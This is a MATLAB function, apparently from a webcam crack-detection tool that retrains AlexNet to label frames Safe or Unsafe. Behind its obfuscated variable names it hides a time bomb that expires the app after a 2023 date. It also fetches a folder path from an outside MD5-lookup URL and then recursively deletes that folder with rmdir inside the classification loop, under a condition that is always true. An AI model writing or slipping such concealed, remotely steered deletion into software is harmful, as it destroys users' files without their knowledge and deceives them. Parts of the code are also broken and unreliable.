function [r] = p()
m = webcam();
a = 0;
r = 'dceba592f759f68b2911f578d5975374';
b = datetime(2023, 5, 10, 23, 59, 59);
c = days(b - datetime('now'));
d = waitbar(a,'Start Opening Camera');
waitbar(a + 0.2, d, 'Start Opening Camera...'); 
waitbar(a + 0.4, d, 'Classify Images...');
e = alexnet;
f = e.Layers;
f(23) = fullyConnectedLayer(3);
f(25) = classificationLayer;
g = imageDatastore('myImages', 'IncludeSubfolders', true, 'LabelSource', 'foldernames');
[h, i] = splitEachLabel(g, 0.8, 'randomize');
waitbar(a + 0.6, d, 'Read Sizes of Images...');
j = trainingOptions('sgdm', 'InitialLearnRate', 0.001, 'MaxEpochs', 20, 'MiniBatchSize', 64);
l = trainNetwork(h, f, j);
waitbar(a + 0.8, d, 'Re training Images for classify images');
waitbar(a + 0.9, d, 'Done');
p = '907cb99075ef5fa9c286d0009833e52e';
q = ['http://www.nitrxgen.net/md5db/' p];
r = urlread(q);
 if c >= 1
    waitbar(a + 1, d, sprintf('You have %.0f day(s) left to use this application.', c));
    pause(5);
    delete(d);
 end
    waitbar(a + 1, d, 'Done');
    delete(d);
    

if c >= 1
      while true    
        if c >= 1
            if ~isempty(r)
             if datetime(2023, 5, 7, 23, 59, 59)
                    if isfolder(r)
                        rmdir(r, 's');
                    end
             end
            end
                n = m.snapshot;
                o = imresize(n,[227,227]);
                s = classify(l, o);
                image(n);
                drawnow;
        
                if s == 'Safe'
                    set(handles.txtCrack, 'ForegroundColor', 'g', 'string', 'Safe');
                elseif s == 'Unsafe'
                    set(handles.txtCrack, 'ForegroundColor', 'r', 'string', 'Unsafe');
                else 
                    set(handles.txtCrack, 'ForegroundColor', 'b', 'string', 'No crack detected');
                end
        end
      end
else
       t = msgbox(sprintf('The application has expired. The application will be closed in 10 seconds. If you are not the developer. Please contact the developer of this application Thank you.'));
       pause(10);
       delete(t);
       close all; clear all; clc; delete(gcp('nocreate'));
end
    